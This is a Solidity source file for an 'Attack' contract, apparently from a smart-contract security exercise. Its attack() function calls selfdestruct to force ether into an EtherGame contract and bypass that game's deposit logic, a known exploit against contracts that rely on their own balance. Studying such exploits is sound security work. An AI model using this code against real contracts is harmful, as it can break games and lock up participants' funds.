// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {IEtherGame} from "./IEtherGame.sol";

contract Attack {
    IEtherGame public ethergame;

    constructor(address _ethergame) {
        ethergame = IEtherGame(_ethergame);
    }

    function attack() external payable{
        
        address payable addr = payable(address(ethergame));
        selfdestruct(addr);


    }
}